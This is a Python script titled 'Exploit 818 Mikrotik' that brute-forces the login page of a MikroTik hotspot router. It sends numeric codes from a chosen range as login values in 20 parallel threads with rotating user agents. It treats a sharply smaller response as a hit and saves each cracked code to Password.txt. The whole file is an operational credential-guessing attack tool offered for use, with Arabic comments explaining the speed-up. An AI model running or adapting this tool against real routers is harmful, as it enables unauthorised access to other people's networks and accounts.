#!/usr/bin/python3
# coding=utf-8
# *******************************************************************
# *** (EX-818-M) Exploit 818 Mikrotik ***
# * Version:
#   v1.1
# * Date:
#   19 - 08 - 2019 { Mon 19 Aug 2019 }
# * Facebook:
#   http://fb.com/mhm.hack
# * Author:
#   Hathem Ahmed
# *******************************************************************

import os
import sys
import time
from re import split as SP
from random import randint
sys.path.append('../modules/')
from tools import agent as _USER_AGENT
from color import *
try:
    import requests
except ImportError:
    print("[!] Error import 'requests' model")
    exit()
    


def write(M, T):
    for c in M + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(T / 100)


def cou(word) -> int():
    n = 0
    for i in word:n += 1
    return n


def _PRINT(*args, **kwargs):
    _MSG = args[0].strip()
    return print(args[0])



def URL_CLEAR(*args, **kwargs):
    _RE_ = args[0]
    _RE_ = _RE_.replace("http://","") if 'http' in _RE_ else _RE_
    _RE_ = _RE_.rsplit("/")[0] if "/" in args[0] else _RE_
    return _RE_



def _WRITE_PASSWORD(*args, **kwargs):
    _FILE_ = open(os.path.join(os.getcwd(),'Password.txt'), 'a')  
    _FILE_.write(f"\n{'+'*5} Mr.MHM {'+'*5}\nPASSWORD: {args[0]}\n")
    _FILE_.close()



def _INDEX(*args, **kwargs):
    os.system("clear")
    _PRINT(f"[ {Y}===>{N} ] Find {W}{args[3]}{N} Passwords and write in {os.getcwd()}/Password.txt ^^\n") if int(args[3]) > 0 else ""

    _P = (f"""    {R}[{N}    {args[0] + 1}    {R}]{N}
[{B} * {N}] SIZE     : {args[1].headers['Content-Length']} Bytes
[{B} * {N}] URL      : {URL_CLEAR(args[1].url)}
[{B} * {N}] P
ASSWORD : {args[2]}
[{B} * {N}] TIMEOUT  : {args[1].elapsed.total_seconds()}\n\n\n--- Enter Ctrl+C for (exit) ---""")
    return _PRINT(_P)



def _REQUESTS_SU(*args, **kwargs):
    global _S

    HOST, PASSWIRD = args

    _S = requests.Session()
    _S.headers['User-Agent'] = _USER_AGENT(randint(0,10))

    _DATA = {"username": str(PASSWIRD)}

    try:

        _GET = _S.post(url=f"http://{HOST}/login", data=_DATA)

    except:
        _PRINT(f"[{R} - {N}] Sorry ERROR For Connection !!")
        sys.exit(0)


    return _GET




import concurrent.futures
import threading

# تعريف المتغيرات المشتركة والقفل لضمان عدم التداخل بين المسارات
lock = threading.Lock()
_A_global = 0
FIND_global = 0
PROCESS_SIZE_global = 0
_R_global = True

def _PROCESS_SINGLE_PASSWIRD(HOST, PASSWIRD):
    global _A_global, FIND_global, PROCESS_SIZE_global, _R_global
    
    # 1. إرسال الطلب بشكل منفصل داخل المسار لتسريع العملية
    DATA = _REQUESTS_SU(HOST, PASSWIRD)
    
    # 2. حماية المتغيرات المشتركة أثناء تقييمها
    with lock:
        if _R_global is True:
            try:
                PROCESS_SIZE_global = int(DATA.headers['Content-Length'])
            except KeyError:
                pass
            _R_global = False
        
        # التقاط القيم الحالية للمسار الحالي لتمريرها لدالة _INDEX لاحقاً
        current_process_size = PROCESS_SIZE_global
        current_A = _A_global
        current_find = FIND_global
        
        # زيادة العداد _A لكل محاولة
        _A_global += 1

    # 3. التحقق من شروط النجاح الخاصة بك
    try:
        content_length = int(DATA.headers['Content-Length'])
        status_code = int(DATA.status_code)
        
        if content_length < current_process_size and status_code == 200:
            if current_process_size - content_length > 3000:
                _S.get(url=f"http://{HOST}/logout")
                _S.delete(url=f"http://{HOST}/login")                    
                _WRITE_PASSWORD(PASSWIRD)
                
                # استخدام القفل مرة أخرى لأننا نعدل متغيرات مشتركة
                with lock:
                    _R_global = True
                    FIND_global += 1
                    current_find = FIND_global # تحديث القيمة لدالة الفهرسة

        # 4. استدعاء الفهرسة كما هي في كودك
        _INDEX(current_A, DATA, PASSWIRD, current_find)
        
    except Exception:
        # تجاوز الأخطاء الناتجة عن انقطاع الاتصال أو غياب Content-Length
        pass


def _PROCESS_DATA(*args, **kwargs):
    HOST, MINNUM, MAXNUM = args

    ZERO = True if str(MINNUM).startswith("0") is False else False

    # تصفير المتغيرات العامة مع كل استدعاء جديد للوظيفة
    global _A_global, FIND_global, PROCESS_SIZE_global, _R_global
    _A_global = 0
    FIND_global = 0
    PROCESS_SIZE_global = 0
    _R_global = True

    # عدد العمليات المتوازية (المسارات). يمكنك رفع الرقم لتسريع أكبر إذا كان اتصالك والسيرفر يتحملان.
    MAX_WORKERS = 20 

    with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        for PASSWIRD in range(int(MINNUM), int(MAXNUM)):
            # تنسيق الباسورد تماماً كما تفعل في الكود الأصلي
            formatted_password = PASSWIRD if ZERO is True else f"0{PASSWIRD}"
            
            # رمي المهمة للـ ThreadPool لتعمل بالتوازي مع المهام الأخرى
            executor.submit(_PROCESS_SINGLE_PASSWIRD, HOST, formatted_password)


def _SERVER_SYS(*args, **kwargs):
    HOST, MINNUM, MAXNUM = args
    _PROCESS_DATA(URL_CLEAR(HOST), MINNUM, MAXNUM)


class MAIN(object):
    def __init__(self):
        pass

    def run(self, HOST, MINNUM, MAXNUM):
        _SERVER_SYS(HOST, MINNUM, MAXNUM)
